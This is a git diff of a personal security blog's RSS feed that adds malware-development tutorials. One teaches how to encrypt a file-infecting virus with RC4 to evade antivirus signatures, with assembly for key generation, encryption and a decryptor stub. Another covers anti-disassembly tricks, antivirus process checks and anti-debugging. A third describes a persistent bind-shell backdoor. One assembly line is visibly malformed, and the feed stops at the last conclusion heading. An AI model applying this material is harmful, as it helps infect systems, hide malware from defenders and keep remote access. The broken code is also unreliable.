@@ -6,15 +6,392 @@
     <description>Recent content in Linux on Hacklagr0y</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Wed, 13 Jul 2022 12:15:19 +0200</lastBuildDate><atom:link href="https://alagroy-42.github.io/tags/linux/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Fri, 23 Sep 2022 16:02:14 +0200</lastBuildDate><atom:link href="https://alagroy-42.github.io/tags/linux/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Oligomorphism: How to encrypt our virus and evade signature-based detection</title>
+      <link>https://alagroy-42.github.io/malware_dev/oligomorphism/</link>
+      <pubDate>Fri, 23 Sep 2022 16:02:14 +0200</pubDate>
+      
+      <guid>https://alagroy-42.github.io/malware_dev/oligomorphism/</guid>
+      <description>Introduction Until not so long ago, antiviruses were mostly relying on signatures to detect malware. What it means is that, whenever a file written to disk, downloaded or launched, the antivirus software checks if it is a known malware. To do so, it is doing two things. The first one is hashing the sample and check if that specific sample is present in the known malware database. But some type of malware are &amp;ldquo;naturally immune&amp;rdquo; to this kind of analysis.</description>
+      <content>&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
+&lt;p&gt;Until not so long ago, antiviruses were mostly relying on signatures to detect malware. What it means is that, whenever a file written to disk, downloaded or launched, the antivirus software checks if it is a known malware. To do so, it is doing two things. The first one is hashing the sample and check if that specific sample is present in the known malware database. But some type of malware are &amp;ldquo;naturally immune&amp;rdquo; to this kind of analysis. For example, our file infector, except for its first instance that will stay the same all the time, will never get the same hash since it will propagate in different files and that hash analysis is not able to spot infected files. That is why antivirus rely on a second type analysis known as signature-based detection. Once a sample has been found and analyzed, analysts create a signature for this malware, which is a set of rules to identify it. These rules can be plenty of things but are mostly strings present in memory or specific code sequences. With that kind of analysis, once the rules have been written for our infector, the antivirus software will be able to detect our first virus instance but also each infected binaries since they will all contain these specific signatures. That is where oligomorphism comes in.
+Even though nowadays, security software are much more complex and use a wide variety of detection techniques, they still use signature-based analysis and you should always encrypt any piece of code that you put out there in the will or you will not be able to reuse it once it has been found and that a signature exists for it.&lt;/p&gt;
+&lt;h2 id=&#34;what-is-oligomorphism-&#34;&gt;What is oligomorphism ?&lt;/h2&gt;
+&lt;p&gt;Once faced with the problem of antivirus and signature-based detection, virus developers had to adapt. It wasn&amp;rsquo;t possible anymore to put the same self-replicating piece of code in thousands of files on a system without getting detected. That&amp;rsquo;s when a technical race started (and is still continuing now) between malicious software writers and security vendors and that race started with oligomorphism. This word comes from two greek roots: &lt;code&gt;Oligo&lt;/code&gt; which means &amp;ldquo;not much&amp;rdquo; and &lt;code&gt;morph&lt;/code&gt; which means shape. Oligomorphism is a software that will change its shape but now much. Indeed, the executed code and the internal structure of the virus will always remain the same, the only thing that will change is the way it is written to disk. Since at first, antiviruses were only analyzing the file being written or executed, the point was to write an encrypted version of the virus that will change at each replication so that it is not possible to develop a &amp;ldquo;universal&amp;rdquo; signature that will match all the replication of the program.&lt;/p&gt;
+&lt;h2 id=&#34;how-does-it-works-&#34;&gt;How does it works ?&lt;/h2&gt;
+&lt;p&gt;The principle itself is very simple, each occurrence of our self-replicating program has to be different. To do so, we will encrypt the virus using a key algorithm and we will change the key at each occurrence so that the result is different all the time. Once we&amp;rsquo;ve done that, we will bypass the signature-based detection but we still have a (big) problem: our encrypted code is not executable anymore. To remedy that, we will have to add a decryptor, that we won&amp;rsquo;t encrypt so that it stays executable. By doing so, the executed code will be completely different than the one present in the file which is why it will bypass the antivirus and still keep its integrity because the executed code will remain the same at each occurrence.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/oligo_base.png&#34; alt=&#34;oligo&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;lets-code-now&#34;&gt;Let&amp;rsquo;s code now&lt;/h2&gt;
+&lt;p&gt;I will only put code chunks concerning encryption in this article, if you want to check a fully-working oligomorphic virus, &lt;a href=&#34;https://github.com/alagroy-42/Pestilence&#34;&gt;here&lt;/a&gt; is the link to one of mine.&lt;/p&gt;
+&lt;p&gt;First we have to choose an algorithm to encrypt our virus. It is usually a good solution to work with XOR-based algorithms. The advantage of XOR is that it is reversible and it will break code patterns and have a better entropy than ROT-based algorithms. I&amp;rsquo;ve chosen to use the RC4 algorithm that generates a pseudo random bytes stream and it has the advantage that we can use the same algorithm to encrypt and decrypt our function.&lt;/p&gt;
+&lt;p&gt;To proceed, we first want to generate a random key. To do so, we will use the &lt;code&gt;/dev/urandom&lt;/code&gt; file that is a continuous random byte stream. I&amp;rsquo;ve chosen to use a 32 bytes key but it can work with any number even though it is better to choose a power of two.&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;key_gen&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;key_gen&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;nasm&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;key_gen.s&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-nasm&#34; &gt;&lt;code&gt;
+
+generate_key:
+    push    rbp
+    mov     rbp, rsp
+    push    rdi
+    lea     rdi, [rel key_file]     ; /dev/urandom
+    xor     rsi, rsi ; O_RDONLY
+    mov     eax, SYS_OPEN
+    syscall
+    cmp     eax, 0
+    jl      _end                    ; in case we cannot get a key and therefore encrypt our virus
+    push    rax
+    mov     rdi, rax
+    lea     rsi, [rel key]          ; where our key will be stored
+    mov     rdx, key_len
+    mov     eax, SYS_READ
+    syscall
+    pop     rdi
+    mov     eax, SYS_CLOSE
+    syscall
+    leave
+    ret
+
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;Then we will code the RC4 routine (if you want to more about the algorithm, you can visit &lt;a href=&#34;https://en.wikipedia.org/wiki/RC4&#34;&gt;its Wikipedia page&lt;/a&gt;). It is simply the reimplementation of the Wikipedia pseudo-code in ASM.&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;rc4&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;rc4&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;nasm&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;rc4.s&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-nasm&#34; &gt;&lt;code&gt;
+
+; rdi       crypt_pointer
+; rsi       crypt_len
+rc4:
+    push    rbp
+    mov     rbp, rsp
+    sub     rsp, 0x120          ; we reserve space on the stack for the vector
+    sub     rsp, rsi
+    mov     [rsp], rdi
+    mov     [rsp &amp;#43; 0x8], rsi
+    mov     rcx, 0x100
+    xor     al, al
+    lea     rdi, [rsp &amp;#43; 0x10]
+loop_init_vector:
+    stosb
+    inc al
+    loop    loop_init_vector    ; we have a [0...255] vector
+
+    xor     r8, r8
+    xor     r9, r9
+    lea     rdi, [rel key]
+    lea     rsi, [rsp &amp;#43; 0x10]
+    mov     cx, 0x100
+rc4_init_loop:                          ; we now modify the vector with the random bytes of the key
+    mov     rax, r8                     ; the advantage of a power of 2 key is that we can use the AND operator
+    and     rax, 0x1f                   ; instead of DIV and MOD 
+    add     rax, rdi
+    movzx   rdx, BYTE [rax]
+    mov     rbx, r8
+    add     rbx, rsi
+    movzx   r10, BYTE [rbx]
+    add     r9, r10
+    add     r9, rdx
+    movzx   r9, r9b
+    mov     rax, r9
+    add     rax, rsi
+    mov     dl, BYTE [rax]
+    mov     BYTE [rax], r10b
+    mov     BYTE [rbx], dl
+    inc     r8
+    loop    rc4_init_loop
+
+rc4_crypt:                      ; then we encrypt our payload with the generated vector
+    mov     rcx, [rsp &amp;#43; 0x8]
+    lea     rdi, [rsp &amp;#43; 0x110]
+    mov     rsi, [rsp]
+    lea     r10, [rsp &amp;#43; 0x10]
+    xor     r8, r8
+    xor     r9, r9
+
+rc4_crypt_loop:
+    inc     r8
+    movzx   r8, r8b
+    mov     r11, r10
+    add     r11, r8
+    add     r9b, [r11]
+    movzx   r9, r9b
+    mov     r12, r10
+    add     r12, ]
+    mov     dl, [r12]
+    mov     bl, [r11]
+    mov     [r12], bl
+    mov     [r11], dl
+    mov     dl, [r11]
+    add     dl, [r12]
+    movzx   rdx, dl
+    add     rdx, r10
+    mov     al, [rdx]
+    xor     al, BYTE [rsi]
+    mov     BYTE [rdi], al
+    inc     rdi
+    inc     rsi
+    loop    rc4_crypt_loop
+
+    mov     rdi, [rsp]
+    lea     rsi, [rsp &amp;#43; 0x110]
+    mov     rcx, [rsp &amp;#43; 0x8]
+copy_crypted_mem:                   ; and we copy the encrypted payload in the memory
+    lodsb
+    stosb
+    loop    copy_crypted_mem
+
+    leave
+    ret
+
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;Now that we have the algorithm that is gonna encrypt and decrypt our payload, we can use it before copying our payload so that we copy an encrypted version. The last thing that we need to handle is decryption. You should be familiar with the code bouncing technique described in &lt;a href=&#34;https://alagroy-42.github.io/malware_dev/infector_advanced&#34;&gt;this article&lt;/a&gt;. Since we now have to decrypt the payload, it will be simpler to put it always at the same place and therefore use this technique so that we are nopt limited by the space available in the binary.&lt;/p&gt;
+&lt;p&gt;Here is the code of the new payload that will be put in the &lt;code&gt;.text&lt;/code&gt; and that will call the decryptor before jumping on the decrypted code. Of course, the decryptor has to not be encrypted. I put it after the &lt;code&gt;.text&lt;/code&gt; but it would also be great to put it just before the viral code though we would need to calculate the offset of the decryptor to be able to call it.&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;bouncer&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;bouncer&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;nasm&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;bouncer.s&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-nasm&#34; &gt;&lt;code&gt;
+
+payload_mprotect:
+    push    rbx
+    push    r12
+    lea     rdi, [rel payload_mprotect]
+    add     rdi, [rel data_addr_offset]
+    mov     rsi, [rel data_len]
+    mov     rdx, PROT_READ | PROT_WRITE | PROT_EXEC
+    xor     rax, rax
+    add     rax, SYS_MPROTECT                       ; gives execution rights to the payload
+    syscall
+    lea     rdi, [rel payload_mprotect]
+    add     rdi, [rel data_addr_offset]
+    add     rdi, [rel data_len]
+    sub     rdi, virus_len
+    mov     rsi, virus_len
+    push    rdi
+    call    rc4                                     ; decrypts the payload
+    pop     rax
+    call    rax                                     ; jumps on the viral code
+    pop     r12
+    pop     rbx
+    final_jump_opcode: db 0xe9                      ; jumps back to the original entrypoint
+    final_jump: dd _end - $ - 4
+    final_jump_offset equ final_jump - _start
+    final_jump_offset_text equ final_jump - payload_mprotect
+
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;Now, you&amp;rsquo;ve seen the basis of oligomorphism and how to make your virus oligomorphic. Even though it helps a great deal to counter signature-based detection, there is still one part of the code that stays constant, it is the decryptor and there could be a signature developed for it.&lt;/p&gt;
+&lt;p&gt;To counter this, the next step in our malware developer journey is polymorphism and metamorphism and that is where the real fun comes in! The point of polymorphism is that not all generation of our virus use the same decryptor so that there cannot be a unique signature produced. Once security vendors understood that files were not gonna contain signatures anymore, they decided to sandbox the software before executing them for real. It means that it will be executed in a controlled-environment and then the process memory will be analyzed. Once decrypted, our payload is constant and looking for its signature inside the memory would prove successful so to avoid that, we can write metamorphic code. It means self-modifying code, each time our infector will replicate, it will provide a totally different payload though it will still achieve the same function. I&amp;rsquo;m still working on my metamorphic engine and will come back for another article once it is ready.&lt;/p&gt;
+</content>
+    </item>
+    
     <item>
       <title>Obfuscation: The Art of pissing off reverse-engineers</title>
       <link>https://alagroy-42.github.io/malware_dev/obfuscation_techniques/</link>
       <pubDate>Wed, 13 Jul 2022 12:15:19 +0200</pubDate>
       
       <guid>https://alagroy-42.github.io/malware_dev/obfuscation_techniques/</guid>
-      <description></description>
-      <content></content>
+      <description>Introduction To keep things simple, in cybersecurity operations, there are two teams : the blue team and the red team, the defenders and the attackers. Even though they seem completely different, each one&amp;rsquo;s goal is to make the other team&amp;rsquo;s job as hard as possible and eventually to defeat it. To do that, blue-teamers often use reverse-engineering to get a grasp on how malware works and how to mitigate its effect.</description>
+      <content>&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
+&lt;p&gt;To keep things simple, in cybersecurity operations, there are two teams : the blue team and the red team, the defenders and the attackers. Even though they seem completely different, each one&amp;rsquo;s goal is to make the other team&amp;rsquo;s job as hard as possible and eventually to defeat it. To do that, blue-teamers often use reverse-engineering to get a grasp on how malware works and how to mitigate its effect. Here, we will see how we can try to make their job harder if they want to analyze our virus. There is usually two stages in the malware analysis : the static analysis and the dynamic one. The static consists in deassembling/decompiling the code to try to understand it though sometimes you cannot really understand a malware internal function just by reading it so you have to dynamically analyze it using debuggers to trace the execution and analyze ot step by step.&lt;/p&gt;
+&lt;h2 id=&#34;countering-static-analysis&#34;&gt;Countering static analysis&lt;/h2&gt;
+&lt;h3 id=&#34;preliminary-analysis&#34;&gt;Preliminary analysis&lt;/h3&gt;
+&lt;p&gt;The fist step of static analysis will obviously be to list symbol names, variables or anything relevant in the code. For usual malware, it is recommended to strip the binary and to alter the functions/variables names to avoid it being useful in any way. There are a lot of automated software for that. In our case, let&amp;rsquo;s assume that it is the code of an infected binary that has been recovered. There won&amp;rsquo;t be any symbol names related to the viral code so that won&amp;rsquo;t be a problem. There is still one thing that is critical for analysis : raw strings. By using the &lt;code&gt;strings&lt;/code&gt; command, you can list all the alphanumerical strings present in the binary. Even though our code usually won&amp;rsquo;t rely on strings too much, we will still use some of them that would be very useful to analysts like the infection folders or &lt;code&gt;/bin/sh&lt;/code&gt; for the backdoor. To avoid having those raw strings in the code a good thing would be to store an encrypted value that would be decrypted at runtime, preferably not only alphanumerical so it doesn&amp;rsquo;t appear in the string list (avoid base 64, ROT or this kind of algorithm, XOR-based ones are usually a better solution).&lt;/p&gt;
+&lt;h3 id=&#34;code-analysis&#34;&gt;Code analysis&lt;/h3&gt;
+&lt;p&gt;Once the preliminary checks are done, it is usually time to analyze the code. In our case, let&amp;rsquo;s assume that the analyst found where the malicious code is, it will disassemble it to try to understand it. To deceive them, we will use several obfuscation to fool automated tools or even their comprehension of the code. Let&amp;rsquo;s review some of these.&lt;/p&gt;
+&lt;p&gt;Here is a code sample that we are gonna alter and see the differences &lt;code&gt;objdump&lt;/code&gt; is gonna show us and how it can help us to deceive analysts.&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;sample&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;sample&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;nasm&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;sample.s&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-nasm&#34; &gt;&lt;code&gt;
+BITS 64
+
+section .text
+
+_start:
+    push    rbp
+    mov     rbp, rsp
+    xor     rax, rax
+    add     rax, 0xff
+    push    rax
+    mov     rdx, rax
+    sub     rax, rdx
+    leave
+    ret
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;Once compiled it gives us the following output when we disassemble it with &lt;code&gt;objdump&lt;/code&gt;:
+&lt;img src=&#34;https://alagroy-42.github.io/obf_sample.png&#34; alt=&#34;obf_sample&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s see how we are gonna alter this output and try to hide what the code is doing without altering its function with a few techniques.&lt;/p&gt;
+&lt;h4 id=&#34;dead-code&#34;&gt;Dead code&lt;/h4&gt;
+&lt;p&gt;The first and very easy way to obfuscate code is to add dead code inside that will show up but never be executed. It is very easy to do but also to undo. The principle is to add an unconditional jump to skip all the useless code. Obviously since it is very easy to do, it is also very easy to undo as an analysts. Since the jump is unconditional, the execution flow is very easy to follow so dead code will be very easy to detect. One of the other downside of this technique is that putting useless code takes place so when the payload size matters, it is not a very good idea to use it.&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;dead_code&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;dead_code&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;nasm&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;dead_code.s&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-nasm&#34; &gt;&lt;code&gt;
+BITS 64
+
+section .text
+
+_start:
+    push    rbp
+    mov     rbp, rsp
+    xor     rax, rax
+    jmp     end_of_dead_code ; All the code that follows before the label will never get executed
+    push    rax
+    pop     rbx
+    mov     rcx, rax
+    call    end_of_dead_code
+    ret
+    jmp     _start
+end_of_dead_code:
+    add     rax, 0xff
+    push    rax
+    mov     rdx, rax
+    sub     rax, rdx
+    leave
+    ret
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;Now &lt;code&gt;objdump&lt;/code&gt; is gonna show us all those useless instructions that are gonna add some noise to the analysis :&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/obf_dead_code.png&#34; alt=&#34;obf_dead_code&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;fake-jumps&#34;&gt;Fake jumps&lt;/h4&gt;
+&lt;p&gt;Let&amp;rsquo;s get to real things now, the &amp;ldquo;fake jump&amp;rdquo; technique is one that I quite like and it is very simple to use. Its principle is very simple, it will jump on the next &amp;ldquo;real&amp;rdquo; instruction that we want to execute, and we put one or two dead bytes between the jump and the instruction. By carefully controlling these dead byte values to opcodes, we will make some tools like &lt;code&gt;objdump&lt;/code&gt; or the &lt;code&gt;gdb&lt;/code&gt; disassembler that those dead bytes are the beginning of an instruction which is gonna alter their interpretations of the next few instructions to totally different ones though the execution will remain the same.&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;sample&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;sample&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;nasm&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;sample.s&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-nasm&#34; &gt;&lt;code&gt;
+BITS 64
+
+section .text
+
+_start:
+    push    rbp
+    mov     rbp, rsp
+    jmp $&amp;#43;4
+    db 0x48, 0x8d ; Here we use REX.W LEA
+    xor     rax, rax
+    add     rax, 0xff
+    push    rax
+    mov     rdx, rax
+    sub     rax, rdx
+    leave
+    ret
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;And here is what we get once we disassemble this sample with &lt;code&gt;objdump&lt;/code&gt; :&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/obf_fake_jump.png&#34; alt=&#34;obf_fake_jump&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We can see that it changed the way our code was disassembled although it won&amp;rsquo;t change anything about its execution. Placing a lot of those in your code will completely affect the output of this kind of tool like &lt;code&gt;objudmp&lt;/code&gt; or &lt;code&gt;gdb&lt;/code&gt;. However, this technique won&amp;rsquo;t work with modern disassembler like IDA which will disassemble the destination of the jump, which is our instructions.&lt;/p&gt;
+&lt;h4 id=&#34;fake-ret&#34;&gt;Fake ret&lt;/h4&gt;
+&lt;p&gt;Another interesting technique to use to counter static code analysis is the fake return technique. First, let&amp;rsquo;s talk about what the &lt;code&gt;call/ret&lt;/code&gt; instructions really do. &lt;code&gt;call&lt;/code&gt; is like a jump at the difference that it will push the &lt;code&gt;rip&lt;/code&gt; value on the stack before jumping so that when &lt;code&gt;ret&lt;/code&gt; is called it will pop that value and jump on it to get back to where we were. It means that if we manage to push the address of the next &amp;ldquo;real&amp;rdquo; instruction on the stack and then use &lt;code&gt;ret&lt;/code&gt;, it won&amp;rsquo;t do anything but most of the disassemblers/decompilers still nowadays are gonna stop decompiling the procedure as soon as it reaches the &lt;code&gt;ret&lt;/code&gt; instruction. I will use a macro here for clarity.&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;fake_ret&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;fake_ret&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;nasm&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;fake_ret.s&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-nasm&#34; &gt;&lt;code&gt;
+BITS 64
+
+%macro PUSH_RET 0
+    push    rax
+    push    rax
+    lea     rax, [rel %%ret_to]
+    mov     QWORD [rsp &amp;#43; 0x8], rax
+    pop     rax
+    ret
+    %%ret_to:
+%endmacro
+
+section .text
+    global _start
+
+_start:
+    push    rbp
+    mov     rbp, rsp
+    PUSH_RET
+    xor     rax, rax
+    add     rax, 0xff
+    push    rax
+    mov     rdx, rax
+    sub     rax, rdx
+    leave
+    ret
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/obf_fake_ret.png&#34; alt=&#34;obf_fake_ret&#34;&gt;&lt;/p&gt;
+&lt;p&gt;As you can see here, although the code that will be executed is basically the same, the disassembler shows it as being two different procedures, including one that will never be called (supposedly of course).&lt;/p&gt;
+&lt;h2 id=&#34;countering-dynamic-analysis&#34;&gt;Countering dynamic analysis&lt;/h2&gt;
+&lt;h3 id=&#34;anti-av-ultra-basic&#34;&gt;Anti-AV (ultra-basic)&lt;/h3&gt;
+&lt;p&gt;Let&amp;rsquo;s consider that the infected system might have an AV/EDR running and that we know that some of them will catch us. We can have a &amp;ldquo;blacklist&amp;rdquo; that contains program name that will stop the execution of our program if running. To do that, we can check, for every numeric folder in the &lt;code&gt;/proc&lt;/code&gt; directory (which are fds), their &lt;code&gt;status&lt;/code&gt; file inside which there is a field that contains the name of the executable. By doing that, we can check every program running and see if we are safe to proceed with malicious activity.&lt;/p&gt;
+&lt;h3 id=&#34;anti-debugger&#34;&gt;Anti-debugger&lt;/h3&gt;
+&lt;p&gt;To be fair, anti-debugging is quite hard in the sense that a debugger can alter our program at runtime and by doing so, it can change return or register values and defeat our anti-debugging. Though, it is still useful to try to avoid tampering for two reasons, an automated program tracing our execution would not be able to find out about the anti-tampering routine. The other reason is that even though a human manually tracing the execution would be able to patch the anti-tampering checks, it would still induce a more or less significant loss of time depending on the technique used. The technique that is the most common is to use the &lt;code&gt;ptrace&lt;/code&gt; syscall in various way to check that. The first way os to try to attach to the parent process. In case it fails, it means that it is already tracing us which would imply that the parent process is probably a debugger. Since a process can be traced by only one process, another way to do so is to fork and then trace the child while the child will trace the parent. By doing so, we can check if one of them is already being traced (our own tracing would fail) but if we manage to &amp;ldquo;double trace&amp;rdquo; ourself, no process would be able to attach after the check since we already did. Even though those &lt;code&gt;ptrace&lt;/code&gt; techniques are great and useful, in the case of file infector, they can alter the way our host program works (it breaks &lt;code&gt;bash&lt;/code&gt; for example), which is something we absolutely don&amp;rsquo;t want for stealth reasons. To avoid that, the technique I used for my viruses is to check the &lt;code&gt;/proc/self/status&lt;/code&gt; file. This file contains plenty of information about the current process (ourself) including a &lt;code&gt;TracerPid&lt;/code&gt; field. If it is not null, we are being debugged.&lt;/p&gt;
+&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;This is a little introduction to code obfuscation and anti-tampering. Even though most of these techniques are not applicable in the world of today, it is still a good way to learn the notions and the interest of this kind of techniques. For more advanced obfuscation stuff, I advise you tyo read my next post on &lt;a href=&#34;https://alagroy-42.github.io/malware_dev/oligomorphism&#34;&gt;oligomorphism&lt;/a&gt;.&lt;/p&gt;
+</content>
     </item>
     
     <item>
@@ -24,14 +401,14 @@
       
       <guid>https://alagroy-42.github.io/malware_dev/simple_backdoor/</guid>
       <description>Introduction Now that we have made a stealthy infector that is able to infect any ELF binary present on our system, we now have to make it useful. Being able to propagate is a good thing but we want to make something out of it. A backdoor allowing remote access on the infected machine would be a great idea. How do we do that ? This actually quite simple. Here we won&amp;rsquo;t really take care about stealthiness but I might write an article about it at some point.</description>
-      <content>&lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
+      <content>&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
 &lt;p&gt;Now that we have made a stealthy infector that is able to infect any ELF binary present on our system, we now have to make it useful. Being able to propagate is a good thing but we want to make something out of it. A backdoor allowing remote access on the infected machine would be a great idea. How do we do that ? This actually quite simple. Here we won&amp;rsquo;t really take care about stealthiness but I might write an article about it at some point. The purpose of this backdoor will be to have an almost-permanent remote access on the machine. For that, we will assume that enough binaries are infected so that when the backdoor is closed, it will be reopened when the infected machine will run a command. I won&amp;rsquo;t show any code for this article but if you want to get a very similar backdoor ASM source code, you can find it &lt;a href=&#34;https://github.com/alagroy-42/Durex&#34;&gt;here&lt;/a&gt; in the Assembly files&lt;/p&gt;
-&lt;h3 id=&#34;how-to-run-background-&#34;&gt;How to run background ?&lt;/h3&gt;
+&lt;h2 id=&#34;how-to-run-background-&#34;&gt;How to run background ?&lt;/h2&gt;
 &lt;p&gt;First, what we have to do is making sure tht the backdoor will be running in background at any time. For that, we have to launch it via the viral code but we also want to make its execution continue after the virus/command has been executed. We can use the daemonization principle to do that (&lt;code&gt;man 7 daemon&lt;/code&gt;). A daemon is simply a process that runs in background. To make our program a daemon, we will first have to fork to detach from the main process to let it do its thing. Once we have done that, we will fork, make the child the session leader and then fork again without forgetting to kill the parent processes (except for the main thread of course). A last thing to do for our backdoor is to check that there is only one instance running (checking that before daemonizing would be great but it can be done afterwards). To check that the process is not already running, we can use UNIX socket. We will create one in &lt;code&gt;/var/lock&lt;/code&gt; because that is the right place to do it. Once it is created, we can try to connect to it. If we cannot, it means that another instance of the backdoor is running.&lt;/p&gt;
-&lt;h3 id=&#34;what-about-rce-&#34;&gt;What about RCE ?&lt;/h3&gt;
+&lt;h2 id=&#34;what-about-rce-&#34;&gt;What about RCE ?&lt;/h2&gt;
 &lt;p&gt;We now have the ability to run a single instance of the program in background and make it do what we want so what do we want it to do ? To allow remote code execution, the best solution is to use TCP socket. Those are used to open a port and listen for an incoming connection. Since we want to be able to connect to it, we have to specify the port and not let the system decide about it. That would also work to check that we have a single instance running since we cannot use a port several times unless we modify the socket options but that would not work if we want to make our backdoor a bit fancier and add some functionalities like multi-client handling. The advantage of that is that the &lt;code&gt;listen&lt;/code&gt; syscall will only return once it has received a connection so the backdoor will run indefinitely in background. Once this connection returns, it means a client has connected. Since our backdoor doesn&amp;rsquo;t do any fancy stuff like network traffic encoding for now, we don&amp;rsquo;t have to actually code a client and we can just use the &lt;code&gt;netcat&lt;/code&gt; command. Giving RCE to our new client will be very easy once this one is connected. We will redirect all the standard fds (stdin, stdout and stderr) to the socket using the &lt;code&gt;dup2&lt;/code&gt; syscall and once that is done, we will substitute our process by &lt;code&gt;/bin/sh&lt;/code&gt; using &lt;code&gt;execve&lt;/code&gt;. Do not forget to specify the &lt;code&gt;-i&lt;/code&gt; argument to &lt;code&gt;/bin/sh&lt;/code&gt; to make the process interactive so that the client receives a prompt.&lt;/p&gt;
-&lt;h3 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h3&gt;
-&lt;p&gt;Good job, we made our very simple but also very effective backdoor. I might write another article later about it to make a more evolved backdoor that includes network-traffic encoding, ICMP exfiltration and other fancy features that will make it stealthier. Now that we have a proper malicious payload in our infector, let&amp;rsquo;s imagine that a reverse-engineer wants to try to check it out, it would be great to make its task harder. You can check that &lt;a href=&#34;https://alagroy-42.github.io/malwawre_dev/obfuscation_techniques&#34;&gt;here&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
